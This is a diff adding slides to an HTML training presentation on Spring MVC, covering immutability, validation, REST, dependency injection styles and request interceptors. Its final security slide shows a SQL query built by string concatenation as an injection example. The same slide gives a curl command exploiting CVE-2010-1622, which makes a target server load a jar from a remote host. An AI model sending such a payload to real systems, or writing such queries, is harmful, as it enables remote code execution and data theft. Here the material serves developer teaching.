@@ -358,6 +358,68 @@ public class TodoItem {
         </section>
         
         <section>
+          <h2>Shared mutable state</h2>
+          <ul>
+            <li>Consider a large object tree (XML document, customer data)
+            <pre><code data-trim>
+class Customer {
+  private String name;
+  public String getName() { return name; }
+  public void setName (String name) { this.name = name; }
+  
+  /* many more fields and sub-objects */
+}
+            </code></pre>
+            </li>
+            <li>Just getting this from storage into heap takes 300ms</li> 
+            <li>Many concurrent requests read from it, only few affect changes to it</li>
+          </ul>
+          <p>Cache it!
+          <br/> ... but what about those setters?</p>
+        </section>
+        
+        <section>
+          <h2>Shared mutable state</h2>
+          <ul>
+            <li>Given our <code>Customer</code> has at least the following fields:
+            <pre><code data-trim>
+class Customer {
+  private String name;
+  private UUID id;
+  
+  /* getters and setters for all fields */
+}
+            </code></pre></li>
+            <li>Consider the following method signature:
+            <pre><code>public void save (Customer c);</code></pre>
+            </li>
+            <li>Quiz: what are the side-effects of invoking this method?</li>
+          </ul>
+        </section>
+        
+        <section>
+          <h2>Immutability</h2>
+          <ul>
+            <li>Making your DTO immutable
+              <ul>
+                <li>gives the object holder uses beyond the one point in time</li>
+                <li>allows for it to be safely passed to other threads</li>
+                <li>allows for it to be safely cached</li>
+              </ul>
+            </li>
+            <li>Want to allow changes a DTO? Just declare a method
+            <pre><code data-trim class="java">
+class Customer {
+  public Customer changeName(String first, String last) {
+    return new Customer (first, last, id, /* ... other ... */ );
+  }
+}
+            </code></pre>
+            </li>
+          </ul>
+        </section>
+        
+        <section>
           <h2>Request lifecycle</h2>
           <p style="float:left; width: 40%;">
             <img src="http://yuml.me/diagram/scruffy;/activity/(start)-1 Request>(DispatcherServlet)->(Controller)-2 ModelAndView>(DispatcherServlet)->(ViewResolver)-3 View>(DispatcherServlet)->(View)->(DispatcherServlet)-4 Response>(end).svg"/>
@@ -372,7 +434,8 @@ public class TodoItem {
                 
         <section>
           <aside class="notes">
-            Nothing to do with Hibernate itself
+            - Default Spring Validator very MVC-centered and hard to re-use
+            - Nothing to do with Hibernate itself
           </aside>
           <h2>Validation</h2>
           <p>Integration between Spring MVC and <a href="">Hibernate validator</a></p>
@@ -387,6 +450,24 @@ public class TodoItem {
               <pre><code>NotBlank.item.title = Todo item must have a title</code></pre>
               <pre><code>&lt;form:errors path="title" /&gt;</code></pre>
             </li>      
+          </ul>
+        </section>
+        
+        <section>
+          <h2>Validation in controller methods</h2>
+          <ul>
+            <li>Define a <a href="http://docs.oracle.com/javaee/6/api/javax/validation/Valid.html"><code>@Valid</code></a> argument: throws 
+            <a href="http://docs.spring.io/spring/docs/3.2.5.RELEASE/javadoc-api/org/springframework/web/bind/MethodArgumentNotValidException.html"><code>MethodArgumentNotValidException</code></a> on 
+                validation failure
+                <pre><code class="java">public String handleCreate(@Valid Item item);</code></pre>
+            </li> 
+            <li>Define also a <a href=""><code>BindingResult</code></a> argument: receive validation errors
+                <pre><code class="java">public String handleCreate(@Valid Item item, BindingResult errors);</code></pre>
+                <ul>
+                  <li>This variant is typically used for forms, so the original view
+                      can be rendered on errors.</li>
+                </ul>
+            </li>
           </ul>
         </section>
         
@@ -425,7 +506,157 @@ public class ExistingItemIDValidator
     }
 }          </code></pre>
         </section>
+
+        <section>
+          <h2>REST Services with Spring MVC</h2>
+          <ul>
+            <li>Set up JAXB (for XML) and Jackson (for JSON) in your config</li>
+            
+            <li>Annotate your DTO's with JAXB annotations
+          
+            <li>Just declare controller methods like with forms
+              <ul>
+                <li>Use <a href="http://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/web/bind/annotation/RequestBody.html"><code>@RequestBody</code></a> and 
+                    <a href="http://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/web/bind/annotation/ResponseBody.html"><code>@ResponseBody</code></a> to access (un)marshalled bodies</li>
+                <li>Update their <a href=""><code>@RequestMapping</code></a> with <code>produces=</code>
+                    or <code>consumes=</code> if overlap with HTML UI
+              </ul>
+            </li>
+            
+            <li>Validation framework
+              <ul>
+                <li>Need global exception handler for <a href="http://docs.spring.io/spring/docs/3.2.5.RELEASE/javadoc-api/org/springframework/web/bind/MethodArgumentNotValidException.html"><code>MethodArgumentNotValidException</code></a></li>
+                <li>What to return when trying to PUT an invalid object?</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h1>REST Demo</h1>
+        </section>
         
+        <section>
+          <h2>Spring autowiring variants</h2>
+          <ul>
+            <li>Field injection
+              <pre><code data-trim>
+@Autowired private ItemService itemService;              
+              </code></pre>
+              <ul>
+                <li>Least amount of code</li>
+                <li>Dependency completely hidden from compiler and tests</li>
+                <li>Invites circular references (buggy, esp. with AOP)</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section>
+          <h2>Spring autowiring variants</h2>
+          <ul>
+            <li>Setter injection
+              <pre><code data-trim>
+private ItemService itemService;
+
+@Autowired 
+public void setItemService(ItemService service) {
+    this.itemService = service;
+}             
+              </code></pre>
+              <ul>
+                <li>Dependency visible in tests, but not required</li>
+                <li>Have to choose between <code>public</code> (anyone can change it) or
+                    package-private (only tests in same package can set up class)
+                <li>Invites circular references</li>
+                <li>A little more code</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Spring autowiring variants</h2>
+          <ul>
+            <li>Constructor injection
+              <pre><code data-trim>
+private ItemService itemService;
+
+@Autowired 
+public MyService (ItemService service) {
+    this.itemService = service;
+}             
+              </code></pre>
+
+              <ul>
+                <li>Prevents (most) circular references</li>
+                <li>Hard dependencies declared in the type</li>
+                <li>Easier to test (compiler will help you)</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section>
+          <h2>Cross-cutting request concerns</h2>
+          <p>Two easy ways to add processing around requests</p>
+          <ol>
+            <li>Spring <a href="http://docs.spring.io/spring/docs/3.2.x/javadoc-api/org/springframework/web/servlet/HandlerInterceptor.html"><code>HandlerInterceptor</code></a>
+              <ul>
+                <li>Register in your <code>WebConfig.addInterceptors(...)</code></li>
+                <li>Callbacks before and after request</li>
+                <li>Limited to handling <i>within</i> spring MVC</li>
+              </ul>
+            </li>
+            <li>Standard servlet filter
+              <ul>
+                <li>Override <code>WebInitializer.getServletFilters()</code></li>
+                <li>Wraps the actual invocation, so you can do <code>try</code> / <code>catch</code></li>
+                <li>Can integrate Spring to other frameworks</li>
+              </ul>
+            </li>
+          </ol>
+        </section>
+        
+        <section>
+          <h2>Other security concerns</h2>
+          <ul>
+            <li>SQL Injection
+            <pre><code data-trim contenteditable="true" class="java">
+jdbc.execute("SELECT FROM USERS WHERE name = '" + name +
+             "' AND password = '" + password + "'");</code></pre>
+            </li>
+            
+            <li><a href="http://support.springsource.com/security/cve-2010-1622">Arbitrary code execution</a>
+                due to security bugs in Spring itself
+            <pre><code data-trim contenteditable="true" class="bash">
+curl --data "class.classLoader.URLs[0]=jar:http://dl.com/dino.jar!/" \
+      http://mybank.com/login 
+            </code></pre>
+            </li>
+                
+            <li>Denial of service attacks
+              (need not be an attack, maybe you're just popular)
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <p>Thank you</p>
+
+          <p style="margin-top: 4em">
+            <small>Jan Ypma<br/>
+            <a href="mailto:ypma@lundogbendsen.dk">
+              ypma@lundogbendsen.dk
+            </a></small>
+          </p>
+          
+          <p style="margin-top: 2em; margin-right: 3em; text-align: right">
+            <a href="http://www.lundogbendsen.dk">
+              <img width="300" height="65" src="lb.png" alt="L&amp;B Logo"  style="background-color: white; border: 3px solid white; -webkit-transform: rotate(-10deg); -moz-transform: rotate(-10deg);"/>
+            </a>
+          </p>
+        </section>
 			</div>
 
 		</div>
